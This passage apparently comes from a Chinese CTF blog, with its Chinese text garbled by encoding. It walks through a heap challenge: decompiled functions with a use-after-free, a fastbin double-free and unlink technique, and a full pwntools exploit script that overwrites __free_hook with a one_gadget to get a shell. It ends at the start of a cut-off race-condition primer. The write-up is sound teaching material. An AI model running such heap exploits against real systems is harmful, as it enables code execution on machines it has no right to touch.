class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400A79</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x1F</span> &amp;&amp; (&amp;ptr)[v1] &amp;&amp; dword_6020B0 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    my_input((&amp;ptr)[v1], <span class="number">32LL</span>);</span><br><span class="line">    ++dword_6020B0;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><ul><li>å¯ç”¨æ¥leak libc</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400C01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; (&amp;ptr)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>((&amp;ptr)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>å¾ˆæ˜æ˜¾çš„UAF</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400B54</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; (&amp;ptr)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h1><ol><li>ç”±äºé™åˆ¶äº†æ¯æ¬¡åªèƒ½malloc(0x20)è€Œä¸”åªèƒ½ä¿®æ”¹0x20çš„å­—èŠ‚æ•°ï¼Œå¯ä»¥æœ‰<code>off_by_null</code>,ä½†æ˜¯è¿™é‡Œç»™äº†UAF,å¹¶ä¸”åœ¨<code>glibc2.24</code>ä¸­<code>double free</code>çš„åˆ©ç”¨å§¿åŠ¿ååˆ†ç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨fastbiné“¾è¡¨æ³„éœ²chunkçš„åœ°å€ï¼Œåˆ©ç”¨<code>double free</code>å»æ„é€ ä¸€ä¸ª<code>fake_chunk</code>,è¿™ä¸ªfake_chunkçš„<code>user_data</code>åŒ…å«æŸä¸ªchunkçš„<code>prev_sizeå’Œsize</code>é‚£ä¹ˆå°±å¯ä»¥å®ç°<code>leak libc</code>å’Œ<code>unlink</code>äº†</li><li>åŒæ—¶è¿™é‡Œé™åˆ¶äº†chunkçš„æ•°é‡ï¼Œç›¸å¯¹äºAribitraty allocå¾ˆæ˜æ˜¾æ˜¯ä¸å¤Ÿçš„</li><li>è¿™é¢˜ç›®å‘å…¶å®æŒºå¤šçš„ï¼Œåœ¨ä¸‹é¢è°ƒè¯•çš„æ—¶å€™æ…¢æ…¢è¯´å§</li></ol><h1 id="é¢˜è§£-gdb"><a href="#é¢˜è§£-gdb" class="headerlink" title="é¢˜è§£&amp;gdb"></a>é¢˜è§£&amp;gdb</h1><h2 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak heap_addr"></a>leak heap_addr</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0x31</span>)</span><br><span class="line">add(<span class="number">0</span>,payload) <span class="comment"># æ„é€ fake_chunkå‡†å¤‡</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">heapptr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">lg(<span class="string">&quot;heap_ptr: &quot;</span>,heapptr)</span><br></pre></td></tr></table></figure></div><ul><li><mark>æ³¨æ„è¿™ä¸ªpayload<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0x31</span>)</span><br></pre></td></tr></table></figure></div><p>æœ€åä¸èƒ½æ˜¯<code>p64</code>ï¼Œå› ä¸ºæ˜¯sendlineå‘é€çš„ï¼Œè‡ªå¸¦<code>\n</code>ï¼Œå½±å“ä¸‹ä¸€æ¬¡çš„choice</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108172801562.bmp"></p><ul><li>ä½†å…¶å®åé¢æ— æ‰€è°“æ˜¯ä»€ä¹ˆï¼Œå³ä½¿ä¸ä¿®æ”¹0x20çš„åœ°æ–¹éƒ½æ²¡äº‹</li></ul><h2 id="æ„é€ fake-chunk"><a href="#æ„é€ fake-chunk" class="headerlink" title="æ„é€ fake_chunk"></a>æ„é€ fake_chunk</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,p64(heapptr+<span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">6</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">7</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></div><ul><li>ä¿®æ”¹chunk1çš„fdæŒ‡å‘chun0ä¸‹æ–¹æ„é€ çš„fake_chunk</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108173347173.bmp"></p><ul><li>ä¸‹æ¬¡mallocé‚£ä¹ˆä¾¿ä¼šå°†è¿™å¤„<code>fake_chunk</code>ç»™mallocèµ°ï¼Œé‚£æˆ‘ä»¬ä¿®æ”¹0x20æ­£å¥½å¯ä»¥ä¿®æ”¹chunk1çš„<code>prev_sizeå’Œsize</code>ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é¡ºæ‰‹å¸ƒç½®unlinkæ‰€éœ€çš„æ¡ä»¶ï¼Œå¦‚ä¸‹çš„payload</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line">target = ptr + <span class="number">0x30</span></span><br><span class="line">payload = p64(target-<span class="number">0x18</span>) + p64(target-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p32(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,payload) <span class="comment"># fake_chunk</span></span><br></pre></td></tr></table></figure></div><ul><li>å¯¹äºtargetï¼Œç”±äº0,1å·chunké€šè¿‡uafè¿æ¥çš„æ¯”è¾ƒæ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰chunk3ä¸ºç›®çš„chunkï¼Œunlinkæ˜¯ä¿®æ”¹æŸä¸ªheapä¸º<code>target-0x18</code>ï¼Œæ­¤æ—¶<code>target-0x18</code>æ˜¯chunk3çš„åœ°å€ï¼Œæ•…â€¦..</li></ul><h2 id="leak-libc-unlink"><a href="#leak-libc-unlink" class="headerlink" title="leak libc+unlink"></a>leak libc+unlink</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">b&quot;\x21&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>-<span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div><ul><li>ä¸ºäº†Unlinkæˆ‘ä»¬è¿˜è¦ä¿®æ”¹fake_chunkçš„size&#x3D;0x21(ä¸‹å›¾æ˜¯ä¿®æ”¹ä¹‹å‰çš„)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108174432198.bmp"></p><ul><li><mark>ä¸ºä»€ä¹ˆä¸åœ¨ä¸€å¼€å§‹å°±ä¿®æ”¹ä¸º0x20?<mark></mark></mark></li></ul><p>å› ä¸ºåœ¨fastbinä¸­ä¼šå¯¹å¤„äºåŒä¸€ä¸ªbinçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œä¹‹å‰æ˜¯å°†fake_chunké“¾åœ¨size&#x3D;0x31çš„fastbinä¸Šï¼Œæ‰€ä»¥è¦å°†sizeè®¾ç½®ä¸º0x31ï¼Œæ­¤æ—¶è¦unlinkï¼Œæ‰€ä»¥è®¾ç½®ä¸º0x21</p><h2 id="ezUnlinkè¿ç”¨"><a href="#ezUnlinkè¿ç”¨" class="headerlink" title="ezUnlinkè¿ç”¨"></a>ezUnlinkè¿ç”¨</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.address+<span class="number">0x4527a</span>)) <span class="comment">#+0x4527a</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>å®ç°unlinkä¹‹åçš„å¸ƒå±€</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108174925290.bmp"></p><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> :<span class="built_in">print</span>(p.recv())</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span> <span class="comment"># ubuntu16</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27865)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uafï¼Œæ— PIEï¼Œæ‰“unlink</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)<span class="comment">#p32(0x31)</span></span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">heapptr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">lg(<span class="string">&quot;heap_ptr: &quot;</span>,heapptr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,p64(heapptr+<span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">6</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">7</span>) <span class="comment"># 1</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line">target = ptr + <span class="number">0x30</span></span><br><span class="line">payload = p64(target-<span class="number">0x18</span>) + p64(target-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p32(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,payload) <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">b&quot;\x21&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>-<span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.address+one[<span class="number">1</span>])) <span class="comment">#+0x4527a</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¡ä»¶ç«äº‰</title>
      <link href="/2024/11/05/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
      <url>/2024/11/05/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å‚è€ƒæ–‡ç« :<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/">ctf.wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>æ¡ä»¶ç«äº‰æ˜¯æŒ‡ä¸€ä¸ªç³»ç»Ÿçš„è¿è¡Œç»“æœä¾èµ–äºä¸å—æ§åˆ¶çš„äº‹ä»¶çš„å…ˆåé¡ºåºã€‚å½“è¿™äº›ä¸å—æ§åˆ¶çš„äº‹ä»¶å¹¶æ²¡æœ‰æŒ‰ç…§å¼€å‘è€…æƒ³è¦çš„æ–¹å¼è¿è¡Œæ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç° bugã€‚è¿™ä¸ªæœ¯è¯­æœ€åˆæ¥è‡ªäºä¸¤ä¸ªç”µä¿¡å·äº’ç›¸ç«äº‰æ¥å½±å“è¾“å‡ºç»“æœã€‚</p></blockquote><p><mark>ç®€å•æ¥è¯´å°±æ˜¯å½“ä¸€ä¸ªèµ„æºè¢«ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶è°ƒç”¨ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºé”™ã€‚<mark></mark></mark></p><hr><p>é€šå¸¸ï¼Œæ¡ä»¶ç«äº‰å‡ºç°ä¸‹é¢<code>ä¸‰ç§æƒ…å†µ</code>:</p><blockquote><ul><li>å¹¶å‘ï¼Œå³è‡³å°‘å­˜åœ¨ä¸¤ä¸ªå¹¶å‘æ‰§è¡Œæµã€‚è¿™é‡Œçš„æ‰§è¡ŒæµåŒ…æ‹¬çº¿ç¨‹ï¼Œè¿›ç¨‹ï¼Œä»»åŠ¡ç­‰çº§åˆ«çš„æ‰§è¡Œæµã€‚</li><li>å…±äº«å¯¹è±¡ï¼Œå³å¤šä¸ªå¹¶å‘æµä¼šè®¿é—®åŒä¸€å¯¹è±¡ã€‚<strong>å¸¸è§çš„å…±äº«å¯¹è±¡æœ‰å…±äº«å†…å­˜ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼Œä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™äº›å…±äº«å¯¹è±¡æ˜¯ç”¨æ¥ä½¿å¾—å¤šä¸ªç¨‹åºæ‰§è¡Œæµç›¸äº’äº¤æµã€‚</strong>æ­¤å¤–ï¼Œæˆ‘ä»¬ç§°è®¿é—®å…±äº«å¯¹è±¡çš„ä»£ç ä¸º<strong>ä¸´ç•ŒåŒº</strong>ã€‚åœ¨æ­£å¸¸å†™ä»£ç 